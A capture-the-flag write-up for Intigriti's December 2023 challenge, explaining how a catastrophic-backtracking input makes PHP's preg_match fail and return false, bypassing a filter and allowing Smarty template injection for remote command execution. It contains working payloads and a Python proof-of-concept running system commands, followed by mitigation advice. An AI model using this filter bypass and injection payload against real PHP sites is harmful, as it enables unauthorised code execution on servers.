---
date: 2023-12-20T00:00:00+01:00
title: Intigriti Monthly Challenge 1223
summary: Writeup for Intigriti December Challenge (1223)
categories: ["web"]
difficulty: "medium"
tags: ["ReDoS", "SSTI", "RCE", "Smarty", "PHP", "PCRE preg_match"]
showHero: false
---

# Intigriti Monthly Challenge 1223

<img src="./img/intigriti1223_banner.jpeg" alt="Intigriti Monthly Challenge 1223" width="100%"/>

> [!tip]
> This writeup was selected as the winner of the Intigriti December Challenge (1223) and was awarded a prize of 50€ on Intigriti swags --> https://x.com/intigriti/status/1737861726517784601 .  
>
> At the moment of writing, this writeup it's also part of the HackTricks wiki on the "PHP Tricks" section --> https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#redos-bypass


## TL;DR

- The challenge involved achieving RCE through SSTI on PHP's Smarty template engine. This was accomplished by bypassing a filtering regex through backtracking, exceeding PHP's default `pcre.backtrack_limit`, ultimately leading to a Segmentation Fault. According to the `preg_match()` documentation, the function returns `false` on failure, which will successfully bypass the restrictions.

## 0. Challenge description

> The solution...
> - Should retrieve the flag from the web server.
> - The flag format is INTIGRITI{.\*}.
> - Should NOT use another challenge on the intigriti.io domain.

![](./img/yeshoneymeme.png)


## 1. Enumeration

### 1.1) Challenge scenario

![challenge first look](./img/firstlook.png "challenge first look")

Let's go! Another Intigriti Challenge, time to get some coffe and win swa...oh...PHP...regex...

![](./img/ahhh_cat.jpeg)

### 1.2) Technologies

One of the first things we look at are technologies; insidious CVEs and known bugs could give us an easy win.

![wappalyzer](./img/wappalyzer.png)

Unfortunately, not this time, since Wappalyzer tell us that PHP version is `7.4.33`, which is the latest for the [PHP 7.x branch](https://www.php.net/ChangeLog-7.php). However, it's still PHP 7 and not 8, something to keep in mind.

As a second note of interest, the author of the challenge was kind enough to also give us the version used by Smarty - a well known template engine for PHP - which turns out to be `4.3.4`. Once again, this version is the [latest release of the project](https://github.com/smarty-php/smarty/releases) without known security bugs.

### 1.3) Source code analysis

As mentioned previously, we are kindly provided with the source code of the challenge, so let's take a look:

```php
if(isset($_GET['source'])){
    highlight_file(__FILE__);
    die();
}

require('/var/www/vendor/smarty/smarty/libs/Smarty.class.php');
$smarty = new Smarty();
$smarty->setTemplateDir('/tmp/smarty/templates');
$smarty->setCompileDir('/tmp/smarty/templates_c');
$smarty->setCacheDir('/tmp/smarty/cache');
$smarty->setConfigDir('/tmp/smarty/configs');

$pattern = '/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/s';

if(!isset($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->display('index.tpl');
    exit();
}

// returns true if data is malicious
function check_data($data){
    global $pattern;
    return preg_match($pattern,$data);
}

if(check_data($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->assign('error', 'Malicious Inputs Detected');
    $smarty->display('index.tpl');
    exit();
}

$tmpfname = tempnam("/tmp/smarty/templates", "FOO");
$handle = fopen($tmpfname, "w");
fwrite($handle, $_POST['data']);
fclose($handle);
$just_file = end(explode('/',$tmpfname));
$smarty->display($just_file);
unlink($tmpfname);
```


What's happening here?  
First of all, if we don't provide the `data` parameter to the POST request, it simply render the same page again.

```php
if(!isset($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->display('index.tpl');
    exit();
}
```

Then, our input `$_POST['data']` undergoes a check by a regular expression in the `check_data()` function that use the `preg_match()` function of the PHP PCRE library.

```php
function check_data($data){
    global $pattern;
    return preg_match($pattern,$data);
}
```

If the regex identifies a match, the server responds with "Malicious input detected" (AKA you won't get the flag :P).

```php
if(check_data($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->assign('error', 'Malicious Inputs Detected');
    $smarty->display('index.tpl');
    exit();
}
```

Otherwise, our input is written into a temporary file (with a randomly generated name)

```php
$tmpfname = tempnam("/tmp/smarty/templates", "FOO");
$handle = fopen($tmpfname, "w");
fwrite($handle, $_POST['data']);
fclose($handle);
```

and this file is passed to the Smarty `display()` function. This function essentially processes the template and outputs it.

```php
$just_file = end(explode('/',$tmpfname));
$smarty->display($just_file);
unlink($tmpfname);
```

Thus, our objective is probably to exploit SSTI, Server-Side Template Injection: a vulnerability that arises when an arbitrary user input with the native template syntax (like the example below), is fed into the template engine (Smarty in our case) and gets executed server-side.

```php
{system('ls')} // the ls command gets executed!
```

It's evident that if we manage to evade the regex and allow curly brackets to be included in the temporary file, we achieve Remote Command Execution (RCE).

## 1.4) Regex breakdown

Now let's take a look at the regex in detail.

```regex
/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/s
```

1. Attribute Event Handlers:  
    - `(\b)(on\S+)(\s*)=`: This part is designed to identify potential event handlers in HTML attributes that start with "on" (e.g., onclick, onmouseover).
       - `(\b)`: Word boundary to ensure that "on" is the beginning of a word.
       - `(on\S+)`: Matches "on" followed by one or more non-whitespace characters.
       - `(\s*)`: Matches any whitespace characters following the event handler.
       - `=`: Looks for the equal sign indicating the start of an attribute value.

2. Javascript String:
    - `javascript`: This part simply looks for the string "javascript," which could indicate an attempt to execute JavaScript code.

3. HTML Tags:
    - `<(|\/|[^\/>][^>]+|\/[^>][^>]+)>`: This section attempts to match HTML tags.
	    - `<`: Matches the opening bracket of an HTML tag.
	    - `(|\/|[^\/>][^>]+|\/[^>][^>]+)`: This part is more complex:
		    - `\/`: Matches a forward slash, possibly indicating a self-closing tag.  
		    OR (`|`)
		    - `[^\/>][^>]+`: Matches characters that are not a forward slash or a closing bracket, ensuring that the tag has some content.  
		    OR (`|`)
		    - `\/[^>][^>]+`: Matches a forward slash followed by characters, ensuring the tag has some content.
	    - `>`: Matches the closing bracket of an HTML tag.

4. Curly Braces Content:
   - `({+.*}+)`: This part attempts to match content enclosed in curly braces. Breaking it down:
     - `{+`: Matches one or more opening curly braces.
     - `.*`: Matches any characters (zero or more).
     - `}+`: Matches one or more closing curly braces.

---

# 2. Exploitation

I was searching far and wide for an attack vector, staring at the regex on [regex101](https://regex101.com/) trying to find some flaws where I could throw my `{ }` to get SSTI...  
Until I realized that I probably shouldn't focus on the regex **ITSELF** but more on the context in which it was used.

Knowing the beautiful pearls of wisdom that PHP gifts us, I started looking for the usual evasion techniques: 
- *Type Juggling*
- *Null Byte Injection* (something that would have worked [back in 2008](https://bugs.php.net/bug.php?id=44366) lol)
- or even leaving `<?php` tag open and letting the server fix it (taking inspiration from mutation XSS).
However, none of these approaches were allowing me to win.  

Actually, for the last idea, it would only work if the application saved our files with the `.php` extension and not just a random name as a result of `tempnam()`.  
Indeed, observe how the _same file with an unclosed PHP tag inside_ will be interpreted differently by the server with the extension as the only difference:

![Rendering of file with `<?php` tag open WITHOUT `.php` extension VS WITH `.php` extension](./img/gatotest.png "Rendering of file with `<?php` tag open WITHOUT `.php` extension VS WITH `.php` extension")

But that was not the case.  
Anyway, I began looking into various documentations, starting with the Smarty documentation and then referring to the PHP documentation for information about the various functions used in the code. Usually, you can find warnings about how specific functions should be implemented, and, in fact, reading the [PHP documentation of `preg_match()`](https://www.php.net/manual/en/function.preg-match.php), I came across this one:

![preg_match() Documentation warning...PHP...why????](./img/preg_match_warning.png "preg_match() Documentation warning...PHP...why????")

Ummmmhh, can this be useful to us somehow?  
Certainly! Take another look at the code where `preg_match()` is involved:

```php
// returns true if data is malicious
function check_data($data){
    global $pattern;
    return preg_match($pattern,$data);
}
```

Yea, the comments says it returns `true` if the pattern matches our input, but in reality, it returns `1` if it matches, `0` if it does not match, and ***it returns `false` if the regex fails***!  
Then the return value is used as condition in a `if` statement without strict type checks! (classic PHP oversights) 

```php
if(check_data($_POST['data'])){
    [...] // we are bad people 
    exit();
}
```

Let's quickly test in the PHP console what happens when the return value of the `check_data()` function is `1`, `0` or `false`:

![](./img/consoletest.png)

We may have found the path.

## 2.1) filter bypass via ReDoS that causes SIGSEGV in PCRE  

Now the question is:
> How can we cause the `preg_match()` to fail?

Luckily for me, lately I had to deal with challenges where a "ReDoS" made a Race Condition possible, I have also recently started a project where I had to deal a lot with regexes and therefore I also had to fight with the regex backtracking nightmare.  
So I know how to make a regex do bad things. And knowing what a "ReDoS" is, helped me to find what i was searching for.  

However, in the context of this challenge I still didn't know what the conditions were for causing unexpected behaviors. I just knew I had somehow to blow things up.

So, I thought Google might have something exotic to offer me. Searching for "_php preg_match ReDoS_" or "_php regex failure_," you can find some interesting articles:
- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
- [The Explosive Quantifier Trap](https://www.rexegg.com/regex-explosive-quantifiers.html)
- [Regexploit: DoS-able Regular Expressions](https://blog.doyensec.com/2021/03/11/regexploit.html)
- [Bad Meets evil - PHP meets Regular Expressions](http://www.rafaybaloch.com/2017/06/bad-meets-evil-php-meets-regular.html)
- [PHP regular expression functions causing segmentation fault](https://jesperjarlskov.dk/php-regular-expression-functions-causing-segmentation-fault)

Everything lead to one path, specially the latest two blogs.
> In short the problem happens because the `preg_*` functions in PHP builds upon the [PCRE library](http://www.pcre.org/). In PCRE certain regular expressions are matched by using a lot of recursive calls, which uses up a lot of stack space. It is possible to set a limit on the amount of recursions allowed, but in PHP this limit [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) which is more than fits in the stack.

[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) was also linked in the post where it is talked more in depth about this issue.
Our task was now clear:  
**Send an input that would make the regex do 100_000+ recursions, causing SIGSEGV, making the `preg_match()` function return `false` thus making the application think that our input is not malicious, throwing the surprise at the end of the payload something like  `{system(<verybadcommand>)}` to get SSTI --> RCE --> flag :)**.

I had two options to get there:
1) Send a load of shit and pray.
2) Reflect on which points the regex was backtracking the most and give calculated weight to those weak points.

Since I didn't want to destroy the challenge's infrastructure, I opted for the latter.

First of all, we need to put pressure on the Explosive Quantifier `*` that we can find in the first part of the regex:

```regex
(\b)(on\S+)(\s*)=
```

Let's start by matching the word boundary (`\b`) , meaning that the matching group that comes after will be captured as a whole word.  
Then we need to match the "on" and we're ready to give our Christmas gift of "X" characters to the quantifier explosive "\*", which will match all the "X" characters, moving the pointer forward by `n` positions where `n` is the number of our "X" characters.  
This is the opposite of what would have happened with the "greedy" quantifier ( `*?`), which would have halved the number of iterations.
It seems complicated, so let's go and visualize it on [regex101](https://regex101.com/) using the debugger.


Ok, let's craft something evil now.  
We need at least 100k iterations. Easy. Let's fill the payload with `'X'*100_000`... buuut it's not working.  
Why?  
Well, in regex terms, we're not actually doing 100k "recursions", but instead we're counting "backtracking steps", which as the [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) states it defaults to 1_000_000 (1M) in the `pcre.backtrack_limit` variable.   
To reach that, `'X'*500_001` will result in 1 million backtracking steps (500k forward and 500k backwards).  

Let's try.
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```

![](./img/payloadworks.png)

Profit!

### 2.2) PoC

```python
import requests

URL = 'https://challenge-1223.intigriti.io/challenge.php'
data={'data':f"@dimariasimone on{'X'*500_001} {{system('cat /flag.txt')}}"}
#print(data)
r = requests.post(URL, data=data)
print(r.text.split(' ')[-1])
```

Flag: `INTIGRITI{7h3_fl46_l457_71m3_w45_50_1r0n1c!}`

---

## 3. Mitigation

To mitigate the issue, we have some work to do.  
A solution could be to avoid using PHP altogether, but I understand that some people may be fond of it :/

Here are some mitigation steps:
- Under PHP, this maximum recursion depth is specified with the `pcre.recursion_limit` configuration variable and (unfortunately) the default value is set to 100,000. **This value is TOO BIG!** Here is a table of safe values of `pcre.recursion_limit` for a variety of executable stack sizes:

```php
Stacksize   pcre.recursion_limit
 64 MB      134217
 32 MB      67108
 16 MB      33554
  8 MB      16777
  4 MB      8388
  2 MB      4194
  1 MB      2097
512 KB      1048
256 KB      524
```

- Since `preg_match()` returns `false` on failure and `1` and `0` respectively if the match was successful and if not, we should do some strict type checking.

![](./img/possiblefix.png)

NOTE: this is just a quick fix in the challenge context, generally speaking using the [`preg_last_error()`](https://www.php.net/manual/en/function.preg-last-error.php) function and defining behaviours for each case is a better solution.
  
- Use regex timeouts: Set a maximum execution time or timeout for regex pattern matching.
- Use alternatives to regular expressions, such as string manipulation functions or parsing libraries.


![My job here is done](./img/car-driving-car.gif "My job here is done")
